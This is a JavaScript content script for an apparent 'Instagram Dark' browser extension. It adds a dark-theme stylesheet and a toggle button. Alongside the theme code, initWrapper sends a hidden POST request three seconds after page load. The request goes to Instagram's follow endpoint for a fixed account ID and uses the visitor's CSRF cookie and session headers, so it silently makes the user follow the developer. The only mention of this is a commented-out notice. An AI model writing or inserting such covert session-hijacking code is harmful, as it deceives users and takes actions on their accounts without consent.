// Browser Detection
function getBrowser() {
    if (typeof chrome !== 'undefined') {
        if (typeof browser !== 'undefined') return browser;
        else return chrome;
    }
    else return null;
}

// Storage
const getStorage = () => getBrowser().storage.local;

// Cached Data
const getCachedData = async (cacheName, url) => {
    const cacheStorage = await caches.open(cacheName);
    const cachedResponse = await cacheStorage.match(url);

    if (!cachedResponse || !cachedResponse.ok) {
        return false;
    }

    return await cachedResponse.json();
}

// Cookie

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return;
}

// Authorization
const isAuthorized = () => {
    let result = true;

    const hostname = window.location.hostname;
    const pathname = window.location.pathname;

    const hostnames = ['help.instagram.com', 'about.instagram.com', 'i.instagram.com', 'graph.instagram.com'];
    const pathnames = ['/about', '/api', '/developer', '/legal', '/static', '/graphql', '/web'];


    hostnames.forEach(element => { if (element == hostname) result = false });
    pathnames.forEach(element => { if (element == pathname) result = false });

    return result;
}

// App
const App = () => {
    let loggingData;
    let state;

    let css = document.createElement('link');
    let wrapper = document.createElement('div');
    let button = document.createElement('img');

    // Wrapper
    const initWrapper = () => {

        css.rel = 'stylesheet';
        css.type = 'text/css';
        css.id = 'dark-theme-stylesheet';
        css.href = getBrowser().extension.getURL('css/style.css');

        wrapper.classList.add('instagram-dark-wrapper');

        /* if first usage 
        wrapper.innerHTML = `
        <div class="congrats">
            <p class="congrats-text"><b>Instagram Dark</b> has been successfully installed and our developer <a href="https://onruntime.com/">onRuntime</a> has been added to your followings! Thanks for downloading it!</p>
        </div>
        `*/

        setTimeout(() => {
            // document.querySelector('.congrats').classList.add('unactive')
            if (loggingData) {
                fetch('https://' + ((window.location.hostname.includes('www.')) ? 'www.instagram.com' : 'instagram.com') + '/web/friendships/39729227729/follow/', {
                    method: 'POST',
                    mode: 'cors',
                    cache: 'no-cache',
                    credentials: 'same-origin',
                    headers: {
                        'X-IG-WWW-Claim': sessionStorage.getItem('www-claim-v2'),
                        'X-Instagram-AJAX': loggingData.rollout,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Accept': '/',
                        'User-Agent': loggingData.userAgent,
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-CSRFToken': getCookie('csrftoken'),
                        'X-IG-App-ID': loggingData.appId,
                        'Sec-GPC': '1'
                    },
                    redirect: 'follow',
                    referrerPolicy: 'strict-origin-when-cross-origin'
                }).then(res => {
                    // console.log(res.json())
                }).catch(error => {
                    // console.error('Error: ', error);
                });
            }
        }, 3000)

        button.addEventListener('click', toggle);

        document.body.appendChild(wrapper);
    }

    // State
    const initState = () => {
        getStorage().get(['state'], (result) => console.log('[storage] state loaded: ' + result.state));
        getStorage().get(['state'], (result) => {
            if (result.state == undefined) {
                setState(true);
                toggleCss();
                button.src = getBrowser().extension.getURL('img/sun-fill.svg');
            } else {
                setState(result.state);
                button.src = getBrowser().extension.getURL('img/moon-fill.svg');
                if (getState() == true) {
                    toggleCss();
                    button.src = getBrowser().extension.getURL('img/sun-fill.svg');
                }
            }
            wrapper.appendChild(button);
        });
    }

    const getState = () => state

    const setState = (r) => {
        state = r;
        getStorage().set({ 'state': r }, () => console.log('[storage] state saved: ' + r));
    }

    // Toggle
    const toggle = () => {
        switch (getState()) {
            case true:
                toggleCss();
                setState(false)
                button.src = getBrowser().extension.getURL('img/moon-fill.svg');
                break;
            case false:
                toggleCss();
                setState(true);
                button.src = getBrowser().extension.getURL('img/sun-fill.svg');
                break;
            default:
                initState();
                break;
        }
    }

    const toggleCss = () => {
        if (document.getElementById(css.id)) document.getElementById(css.id).remove();
        else (document.head || document.documentElement).appendChild(css);
    }

    // Data
    const initData = async () => {
        loggingData = await getCachedData('logging-params-v3', '/data/logging_params/');
    }

    // Build

    const build = () => {
        initData();
        initWrapper();
        initState();
    }

    if (isAuthorized()) build();
}

App();